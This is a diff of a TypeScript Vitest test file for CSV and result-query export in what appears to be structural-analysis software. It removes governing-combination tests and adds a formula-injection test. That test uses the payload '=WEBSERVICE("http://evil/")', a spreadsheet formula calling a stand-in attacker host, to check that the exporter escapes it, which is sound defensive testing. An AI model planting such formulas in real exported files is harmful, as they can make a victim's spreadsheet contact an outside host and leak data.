@@ -1,17 +1,12 @@
 import { describe, it, expect } from 'vitest';
 import type { ElementForces3D } from '../types-3d';
-import type { GoverningPerElement3D } from '../governing-case';
 import {
   buildQueryRows,
   extremeRow,
   filterByAbsThreshold,
-  governingForComponent,
-  topGoverning,
   componentEnds,
-  componentToDiagramType,
   diagramTypeToComponent,
   rowsToCsv,
-  governingToCsv,
   type QueryExportMeta,
 } from '../result-query';
 
@@ -107,31 +102,6 @@ describe('result-query: threshold filter predicate', () => {
   });
 });
 
-describe('result-query: governing source label preservation', () => {
-  const governing = new Map<number, GoverningPerElement3D>([
-    [1, { momentZ: { comboId: 3, comboName: '1.2D+1.6L', value: 84.3 } }],
-    [2, { momentZ: { comboId: 5, comboName: '1.2D+1.0W', value: 120.7 }, axial: { comboId: 2, comboName: '1.4D', value: 9 } }],
-  ]);
-
-  it('carries the governing combo name through as sourceLabel', () => {
-    const list = governingForComponent(governing, 'Mz');
-    const e1 = list.find((g) => g.elementId === 1)!;
-    expect(e1.sourceLabel).toBe('1.2D+1.6L');
-    expect(e1.comboId).toBe(3);
-    expect(e1.value).toBe(84.3);
-  });
-
-  it('topGoverning returns the element with the largest governing value + its label', () => {
-    const top = topGoverning(governingForComponent(governing, 'Mz'))!;
-    expect(top).toMatchObject({ elementId: 2, value: 120.7, sourceLabel: '1.2D+1.0W' });
-  });
-
-  it('skips elements with no governing entry for the component', () => {
-    expect(governingForComponent(governing, 'T')).toEqual([]);
-    expect(governingForComponent(governing, 'N').map((g) => g.elementId)).toEqual([2]);
-  });
-});
-
 describe('result-query: empty / no-results behavior', () => {
   it('buildQueryRows on no forces is empty', () => {
     expect(buildQueryRows([], 'Mz')).toEqual([]);
@@ -142,28 +112,13 @@ describe('result-query: empty / no-results behavior', () => {
     expect(extremeRow(buildQueryRows([], 'N'))).toBeNull();
   });
 
-  it('governing lookups on an empty map are empty/null', () => {
-    expect(governingForComponent(new Map(), 'Mz')).toEqual([]);
-    expect(topGoverning([])).toBeNull();
-  });
-
   it('CSV builders emit a header-only document when there are no rows', () => {
     expect(rowsToCsv([], META).split('\n')).toHaveLength(1);
-    expect(governingToCsv([], META).split('\n')).toHaveLength(1);
   });
 });
 
-describe('result-query: component ↔ diagram type', () => {
-  it('maps each component to the matching 3D diagram type', () => {
-    expect(componentToDiagramType('N')).toBe('axial');
-    expect(componentToDiagramType('Vy')).toBe('shearY');
-    expect(componentToDiagramType('Vz')).toBe('shearZ');
-    expect(componentToDiagramType('T')).toBe('torsion');
-    expect(componentToDiagramType('My')).toBe('momentY');
-    expect(componentToDiagramType('Mz')).toBe('momentZ');
-  });
-
-  it('inverse-maps each force diagram type to its component', () => {
+describe('result-query: diagram type → component', () => {
+  it('maps each force diagram type to its component', () => {
     expect(diagramTypeToComponent('axial')).toBe('N');
     expect(diagramTypeToComponent('shearY')).toBe('Vy');
     expect(diagramTypeToComponent('shearZ')).toBe('Vz');
@@ -175,12 +130,6 @@ describe('result-query: component ↔ diagram type', () => {
   it('returns null for non-force diagrams (no silent fallback)', () => {
     for (const dt of ['none', 'deformed', 'colorMap', 'axialColor', 'verification', 'modeShape']) {
       expect(diagramTypeToComponent(dt)).toBeNull();
-    }
-  });
-
-  it('round-trips component → diagram → component', () => {
-    for (const c of ['N', 'Vy', 'Vz', 'T', 'My', 'Mz'] as const) {
-      expect(diagramTypeToComponent(componentToDiagramType(c))).toBe(c);
     }
   });
 });
@@ -214,16 +163,14 @@ describe('result-query: flat CSV serialization with metadata', () => {
     expect(row).toBe('envelope,,Envolvente,N,all,,0,absmax,7,i,5,kN');
   });
 
-  it('governingToCsv: sourceKind=governing, per-row comboId/name, end=governing', () => {
-    const list = governingForComponent(
-      new Map<number, GoverningPerElement3D>([
-        [4, { momentZ: { comboId: 5, comboName: 'U5: 1.2D + 1.6W', value: 47.5 } }],
-      ]),
-      'Mz',
-    );
-    const meta: QueryExportMeta = { ...META, sourceKind: 'governing', sourceName: 'Governing' };
-    const lines = governingToCsv(list, meta).split('\n');
-    expect(lines[0]).toBe(HEADER);
-    expect(lines[1]).toBe('governing,5,U5: 1.2D + 1.6W,Mz,all,,0,absmax,4,governing,47.5,kN·m');
+  it('neutralizes spreadsheet formula prefixes in user-controlled string cells', () => {
+    const rows = buildQueryRows([ef(1, { nStart: -5, nEnd: 5 })], 'N');
+    const meta: QueryExportMeta = { ...META, sourceKind: 'combo', sourceId: 9, sourceName: '=WEBSERVICE("http://evil/")' };
+    const csv = rowsToCsv(rows, meta);
+    // formula prefix is neutralized with a leading apostrophe…
+    expect(csv).toContain("'=WEBSERVICE");
+    expect(csv).not.toContain(',=WEBSERVICE');
+    // …while negative NUMERIC values are untouched
+    expect(csv.split('\n')[1]).toContain(',-5,');
   });
 });
